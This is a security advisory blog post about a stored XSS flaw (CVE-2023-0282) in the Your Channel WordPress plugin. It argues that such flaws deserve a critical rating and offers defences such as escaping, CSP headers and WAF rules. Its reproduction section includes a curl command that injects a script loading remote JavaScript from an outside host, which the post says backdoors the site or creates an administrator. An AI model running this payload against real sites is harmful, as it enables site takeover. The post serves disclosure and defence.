---
layout: post
title: "CWE-79 Danger of stored XSS vulnerability in CMS especially for Wordpress"
categories: wordpress
author:
- TouchWeb.fr
- 202 ecommerce
- Friends-Of-Presta.org
meta: "CVE,Wordpress"
severity: "critical (9.0)"
---

As a developer, the severity level is often considered to be low. By underestimating the gravity, we lower our guard against these vulnerabilities. However, some types of vulnerabilities called "stored XSS" are particularly critical when they spread from the front office to the back office.

## Summary

* **Published at**: 2023-03-03
* **Platform**: All CMS. 
* **Weakness**: [CWE-79](https://cwe.mitre.org/data/definitions/79.html)
* **Severity**: critical (9.0)

Vulnerability by design applied on Your Channel's plugin. This will work on any plugins which suffer of a XSS T2 F2B.

## Description

This publication is a summary of [TouchWeb](https://www.touchweb.fr)'s work studying the impact of XSS vulnerabilities in the context of the Wordpress CMS, following the [PrestaShop related publication](https://security.friendsofpresta.org/modules/2023/02/07/stored-xss.html)

To highlight the criticality of XSS and give us the means to mitigate their effects, TouchWeb conducted its research based on the vulnerability of the [Your Channel plugins](https://wpscan.com/vulnerability/93693d45-5217-4571-bae5-aab8878cfe62), which in versions prior to 1.2.2 has a stored XSS.

It has been wrongly tag as MEDIUM gravity instead of **CRITICAL** gravity : [CVE-2023-0282](https://nvd.nist.gov/vuln/detail/CVE-2023-0282) like many others XSS T2 F2B :
- [WP-SCAN Unauthenticated Stored XSS](https://wpscan.com/search?text=unauthenticated%20stored&vuln_type=14)
- [WP-SCAN Subscriber+ Stored XSS](https://wpscan.com/search?text=subscriber%20&vuln_type=14)

## CVSS base metrics

* **Attack vector**: network
* **Attack complexity**: low
* **Privilege required**: low
* **User interaction**: required
* **Scope**: changed
* **Confidentiality**: high
* **Integrity**: high
* **Availability**: high

**Vector string**: [CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H)

### How to know if a XSS is critical ?

That's important to caracterize with strictness XSS. There is too many people which only tag this vulnerability as "XSS" which is dangerous since there will be misunderstood and often under valuation of gravity.

The most dangerous are XSS of type 2 according to their official CWE ([CWE-79](https://cwe.mitre.org/data/definitions/79.html)), meaning Stored-XSS (or persistent XSS) and more specialy those which can be injected from FRONT by guest or assimilated to target BACK.

We will call them: [CWE-79](https://cwe.mitre.org/data/definitions/79.html) / T2-F2B (Type 2 : Stored XSS AND from Front office to Back office).

In summary, if you can inject a XSS from FRONT as guest (or assimilated), which will be stored in database then interprated on BACK, then it's a critical vulnerability which must be scored CVSS 3 : 9.0+/10 since it unlocks design's vulnerabilities (users's administration / plugins's administration)

For others XSS Type 2 F2F/B2B/B2F (front to front / back to back / back to front), you can preserve a low to medium gravity score. 

Nevertheless, be warn that on Wordpress, XSS of type 1 can be critical if it targets a backoffice due to native predictable backoffice link (natively /wp-admin/).

### Plugin presentation

The [Your channel](https://fr.wordpress.org/plugins/yourchannel/) plugin allow, as subscriber (the lowest native role on Wordpress), to post videos.

The video field is not protected in the sense that the entered value is stored as is in the database and displayed without escaping in the back office.

Example:
* yrc_lang[Videos] entered: <strong>my name</strong>
* result: my name will be displayed in bold in the back office in Your Channel's settings.

From then on, it is possible to inject malicious JavaScript, for example: `<script src='test.js'>`


### Proof of concept

Touchweb provides two benign JavaScript scripts that highlight the vulnerability for Wordpress 4.0+ (we tested for 6.1.1).
* Script A allows injecting a classic-editor plugin containing a backdoor without the knowledge of a moderator, i.e. an administrator with rights.
* Script B allows injecting an administrator (we cannot "disabled it" as PS POC B on creation because WP do not allow this).

**DO NOT TEST IT IN PRODUCTION.**


### How to reproduce?

* We installed Wordpress 6.1.1
* We installed the [yourchannel plugin zip](https://github.com/WPPlugins/yourchannel/archive/refs/tags/0.9.1.zip).
* We allow guest on Wordpress to be able to sign up then create an account as guest
* Login with the account you created as guest and reproduce [this POC](https://wpscan.com/vulnerability/93693d45-5217-4571-bae5-aab8878cfe62) :  by replacing `><script>alert(1)</script>` by `><scrip src=//1j.vc/wp_a.js>` or `><scrip src=//1j.vc/wp_b.js>`

```
curl -v --cookie-jar cookie.txt  -X POST -d "log=YOUR_SUBSCRIBER_LOGIN&pwd=YOUR_SUBSCRIBER_PASSWORD&wp-submit=Log+In" "https://preprod.XXX/wp-login.php" \
&& curl -v --cookie cookie.txt -X POST -d "action=yrc_save_lang&yrc_lang[Videos]=%22%3E%3Cscript%20src%3Dhttps%3A%2F%2F1j.vc%2Fwp_a.js%3E%3C%2Fscript%3E" -H "Content-Type: application/x-www-form-urlencoded" https://preprod.XXX/wp-admin/admin-ajax.php
```

* As administrator, return to the back office on plugin's configuration page (Settings > Your Channel)


### How to best protect yourself?

In the face of a Stored XSS vulnerability targeting the back office, it is impossible to undo all the effects. However, the most dangerous exploits can be limited.

* Systematically escape characters ' " < and > by replacing them with HTML entities and applying strip_tags
* Limit to the strict minimum the length's value in database - a database field which allow 10 characters (`varchar(10)`) is far less dangerous than a field which allow 40+ characters (use cases which can exploit fragmented XSS payloads are very rare)
* Configure CSP headers (content security policies) by listing  externals domains allowed to load assets (such as js files) or being called in XHR transactions (Ajax).
* If applicable: check against all your frontoffice's uploaders, uploading files which will be served by your server with mime type application/javascript (like every .js natively) must be strictly forbidden as it must be considered as dangerous as PHP files.
* Activate OWASP 941's rules on your WAF (Web application firewall) - be warn that you will probably break your backoffice and you will need to preconfigure some bypasses against these set of rules.


### How to know if I'm already infected by a XSS of type 2 (Stored-XSS)?

You must check every tables within your database which could store guest's input, at least against common XSS injection. 
You can find a list of potential hijacked events on [PrestaShop method Validate::isCleanHtml()](https://github.com/PrestaShop/PrestaShop/blob/develop/classes/Validate.php#L507)

Be warn that you will probably face falses positives alerts which can be time consumming.


### How CMS's core team can help ecosystem about CSP headers ?

If you already setup CSP headers, you already know that it's a plague on our E-Commerce ecosystem with tens externals dependancies (cariers / banks / tracking / remarketing / ...), to setup and more over to maintain over time.

This chaos generate front/back breaks on updates which make it stressfull for all professionnals trying to strength their protection against XSS.

It would be very appreciated if core team constrains plugins developpers to list with strictness their externals dependancies in a normative way which permit a professional generation of CSP headers - not based on chaotic front/back exploration.
